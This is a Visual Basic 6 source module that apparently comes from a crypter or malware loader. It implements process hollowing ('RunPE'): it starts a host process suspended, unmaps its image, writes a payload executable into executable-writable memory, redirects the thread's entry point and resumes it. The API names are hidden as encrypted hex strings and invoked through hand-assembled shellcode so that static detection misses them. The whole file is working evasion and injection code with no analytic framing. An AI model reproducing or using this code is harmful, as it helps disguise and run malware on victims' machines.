Attribute VB_Name = "Module3"
Option Explicit

Private Const CONTEXT_FULL              As Long = &H10007
Private Const MAX_PATH                  As Integer = 260
Private Const CREATE_SUSPENDED          As Long = &H4
Private Const MEM_COMMIT                As Long = &H1000
Private Const MEM_RESERVE               As Long = &H2000
Private Const PAGE_EXECUTE_READWRITE    As Long = &H40


Public Declare Sub RtlMoveMemory Lib "kernel32" (Dest As Any, Src As Any, ByVal L As Long)
Private Type SECURITY_ATTRIBUTES
    nLength As Long
    lpSecurityDescriptor As Long
    bInheritHandle As Long
End Type

Private Type STARTUPINFO
    cb As Long
    lpReserved As Long
    lpDesktop As Long
    lpTitle As Long
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadID As Long
End Type

Private Type FLOATING_SAVE_AREA
    ControlWord As Long
    StatusWord As Long
    TagWord As Long
    ErrorOffset As Long
    ErrorSelector As Long
    DataOffset As Long
    DataSelector As Long
    RegisterArea(1 To 80) As Byte
    Cr0NpxState As Long
End Type

Private Type CONTEXT
    ContextFlags As Long

    Dr0 As Long
    Dr1 As Long
    Dr2 As Long
    Dr3 As Long
    Dr6 As Long
    Dr7 As Long

    FloatSave As FLOATING_SAVE_AREA
    SegGs As Long
    SegFs As Long
    SegEs As Long
    SegDs As Long
    Edi As Long
    Esi As Long
    Ebx As Long
    Edx As Long
    Ecx As Long
    Eax As Long
    Ebp As Long
    Eip As Long
    SegCs As Long
    EFlags As Long
    Esp As Long
    SegSs As Long
End Type

Private Type IMAGE_DOS_HEADER
    e_magic As Integer
    e_cblp As Integer
    e_cp As Integer
    e_crlc As Integer
    e_cparhdr As Integer
    e_minalloc As Integer
    e_maxalloc As Integer
    e_ss As Integer
    e_sp As Integer
    e_csum As Integer
    e_ip As Integer
    e_cs As Integer
    e_lfarlc As Integer
    e_ovno As Integer
    e_res(0 To 3) As Integer
    e_oemid As Integer
    e_oeminfo As Integer
    e_res2(0 To 9) As Integer
    e_lfanew As Long
End Type

Private Type IMAGE_FILE_HEADER
    Machine As Integer
    NumberOfSections As Integer
    TimeDateStamp As Long
    PointerToSymbolTable As Long
    NumberOfSymbols As Long
    SizeOfOptionalHeader As Integer
    characteristics As Integer
End Type

Private Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long
    Size As Long
End Type

Private Type IMAGE_OPTIONAL_HEADER
    Magic As Integer
    MajorLinkerVersion As Byte
    MinorLinkerVersion As Byte
    SizeOfCode As Long
    SizeOfInitializedData As Long
    SizeOfUnitializedData As Long
    AddressOfEntryPoint As Long
    BaseOfCode As Long
    BaseOfData As Long
    ' NT additional fields.
    ImageBase As Long
    SectionAlignment As Long
    FileAlignment As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion As Integer
    MinorImageVersion As Integer
    MajorSubsystemVersion As Integer
    MinorSubsystemVersion As Integer
    W32VersionValue As Long
    SizeOfImage As Long
    SizeOfHeaders As Long
    CheckSum As Long
    SubSystem As Integer
    DllCharacteristics As Integer
    SizeOfStackReserve As Long
    SizeOfStackCommit As Long
    SizeOfHeapReserve As Long
    SizeOfHeapCommit As Long
    LoaderFlags As Long
    NumberOfRvaAndSizes As Long
    DataDirectory(0 To 15) As IMAGE_DATA_DIRECTORY
End Type

Private Type IMAGE_NT_HEADERS
    Signature As Long
    FileHeader As IMAGE_FILE_HEADER
    OptionalHeader As IMAGE_OPTIONAL_HEADER
End Type

Private Type IMAGE_SECTION_HEADER
    SecName As String * 8
    VirtualSize As Long
    VirtualAddress  As Long
    SizeOfRawData As Long
    PointerToRawData As Long
    PointerToRelocations As Long
    PointerToLinenumbers As Long
    NumberOfRelocations As Integer
    NumberOfLinenumbers As Integer
    characteristics  As Long
End Type


Private Declare Function CallWindowProcA Lib "user32" (ByVal addr As Long, ByVal p1 As Long, ByVal p2 As Long, ByVal p3 As Long, ByVal p4 As Long) As Long
Private Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
Private Declare Function LoadLibraryA Lib "kernel32" (ByVal lpLibFileName As String) As Long

Public Function CallApiByName(ByVal sLib As String, ByVal sMod As String, ParamArray Params()) As Long
    Dim bvASM(64)   As Byte 'enought to hold code + 10 params
    Dim i           As Long
    Dim lPos        As Long
    Dim sVal        As String

    bvASM(0) = &H58: bvASM(1) = &H59: bvASM(2) = &H59
    bvASM(3) = &H59: bvASM(4) = &H59: bvASM(5) = &H50
   
    lPos = 6
   
    For i = UBound(Params) To 0 Step -1
        bvASM(lPos) = &H68: lPos = lPos + 1
        sVal = (Params(i)): GoSub PutLong: lPos = lPos + 4
    Next
   
    bvASM(lPos) = &HE8: lPos = lPos + 1
    sVal = GetProcAddress(LoadLibraryA(sLib), sMod) - VarPtr(bvASM(lPos)) - 4
    GoSub PutLong: lPos = lPos + 4
    bvASM(lPos) = &HC3
    CallApiByName = CallWindowProcA(VarPtr(bvASM(0)), 0, 0, 0, 0)
   
    Exit Function
PutLong:
   
    sVal = Right$(String(8, "0") & Hex(sVal), 8)
    bvASM(lPos + 0) = ("&h" & Mid$(sVal, 7, 2))
    bvASM(lPos + 1) = ("&h" & Mid$(sVal, 5, 2))
    bvASM(lPos + 2) = ("&h" & Mid$(sVal, 3, 2))
    bvASM(lPos + 3) = ("&h" & Mid$(sVal, 1, 2))
    Return
End Function

Sub Injec(ByVal sHost As String, ByRef bvBuff() As Byte, parameter As String)
    Dim i       As Long
    Dim Pidh    As IMAGE_DOS_HEADER
    Dim Pinh    As IMAGE_NT_HEADERS
    Dim Pish    As IMAGE_SECTION_HEADER
    Dim Si      As STARTUPINFO
    Dim Pi      As PROCESS_INFORMATION
    Dim Ctx     As CONTEXT

    Si.cb = Len(Si)
Call CallApiByName(strDemda(Hex2Str("BE3F79ADC30D30D56D98ECD6EA644D7C65DE8FBB23C2E67FC486FE56C11CD415"), "lol"), strDemda(Hex2Str("E3ABA66E6C7E609C52540837123EA2A69CED671ED3D4F0A31A91BE5C76676D62"), "lol"), VarPtr(Pidh), VarPtr(bvBuff(0)), Len(Pidh))
    Call CallApiByName(strDemda(Hex2Str("BE3F79ADC30D30D56D98ECD6EA644D7C65DE8FBB23C2E67FC486FE56C11CD415"), "lol"), strDemda(Hex2Str("E3ABA66E6C7E609C52540837123EA2A69CED671ED3D4F0A31A91BE5C76676D62"), "lol"), VarPtr(Pinh), VarPtr(bvBuff(Pidh.e_lfanew)), Len(Pinh))
   
    Call CallApiByName(strDemda(Hex2Str("BE3F79ADC30D30D56D98ECD6EA644D7C65DE8FBB23C2E67FC486FE56C11CD415"), "lol"), strDemda(Hex2Str("0B165497A8669F51B31F8557201B6AC78408C9978DECA3BD2D7871181B9A9218"), "lol"), 0, StrPtr(sHost), 0, 0, 0, CREATE_SUSPENDED, 0, 0, VarPtr(Si), VarPtr(Pi))
    CallApiByName strDemda(Hex2Str("08C107B37F111A25CD2A6F93CB70C389DA43AACECCDFFF7E596904A5C55EFF53"), "lol"), strDemda(Hex2Str("187D0D967BEFAEDE497D0E6FA2AEC51AC8F449A8AF7A1CF9C0B7F47F1A054A00"), "lol"), Pi.hProcess, Pinh.OptionalHeader.ImageBase
    CallApiByName strDemda(Hex2Str("BE3F79ADC30D30D56D98ECD6EA644D7C65DE8FBB23C2E67FC486FE56C11CD415"), "lol"), strDemda(Hex2Str("2AA0D78E5F2E94CAACF2A7EB28D7A2DCF688AEB07E19E708476BF507B913AB15"), "lol"), Pi.hProcess, Pinh.OptionalHeader.ImageBase, Pinh.OptionalHeader.SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE
    Call CallApiByName(strDemda(Hex2Str("BE3F79ADC30D30D56D98ECD6EA644D7C65DE8FBB23C2E67FC486FE56C11CD415"), "lol"), strDemda(Hex2Str("3C61D69B6779E462E4A35685C1EC4E30A3E4C8DF1123CD20737E1CE1ADD95437"), "lol"), Pi.hProcess, Pinh.OptionalHeader.ImageBase, VarPtr(bvBuff(0)), Pinh.OptionalHeader.SizeOfHeaders, 0)

    For i = 0 To Pinh.FileHeader.NumberOfSections - 1
   
        RtlMoveMemory Pish, bvBuff(Pidh.e_lfanew + 248 + 40 * i), Len(Pish)
        Call CallApiByName(strDemda(Hex2Str("BE3F79ADC30D30D56D98ECD6EA644D7C65DE8FBB23C2E67FC486FE56C11CD415"), "lol"), strDemda(Hex2Str("3C61D69B6779E462E4A35685C1EC4E30A3E4C8DF1123CD20737E1CE1ADD95437"), "lol"), Pi.hProcess, Pinh.OptionalHeader.ImageBase + Pish.VirtualAddress, VarPtr(bvBuff(Pish.PointerToRawData)), Pish.SizeOfRawData, 0)
    Next i

    Ctx.ContextFlags = CONTEXT_FULL
    CallApiByName strDemda(Hex2Str("BE3F79ADC30D30D56D98ECD6EA644D7C65DE8FBB23C2E67FC486FE56C11CD415"), "lol"), strDemda(Hex2Str("12E11C0F10C48F4ED58F1CE9773763FBABF961F2DCE9EAA1978055164A9F89CF"), "lol"), Pi.hThread, VarPtr(Ctx)
    Call CallApiByName(strDemda(Hex2Str("BE3F79ADC30D30D56D98ECD6EA644D7C65DE8FBB23C2E67FC486FE56C11CD415"), "lol"), strDemda(Hex2Str("3C61D69B6779E462E4A35685C1EC4E30A3E4C8DF1123CD20737E1CE1ADD95437"), "lol"), Pi.hProcess, Ctx.Ebx + 8, VarPtr(Pinh.OptionalHeader.ImageBase), 4, 0)
    Ctx.Eax = Pinh.OptionalHeader.ImageBase + Pinh.OptionalHeader.AddressOfEntryPoint
    CallApiByName strDemda(Hex2Str("BE3F79ADC30D30D56D98ECD6EA644D7C65DE8FBB23C2E67FC486FE56C11CD415"), "lol"), strDemda(Hex2Str("3717C6098DAE7CB00E72BF9B4E69A116598A5CEF1C406A6BA226EB06943CA52C"), "lol"), Pi.hThread, VarPtr(Ctx)
    CallApiByName strDemda(Hex2Str("BE3F79ADC30D30D56D98ECD6EA644D7C65DE8FBB23C2E67FC486FE56C11CD415"), "lol"), strDemda(Hex2Str("704F0B1EE791A40291C6332D9FE18730B1BEFB7E4446D3CC7A42152DCF3D5D70"), "lol"), Pi.hThread
End Sub

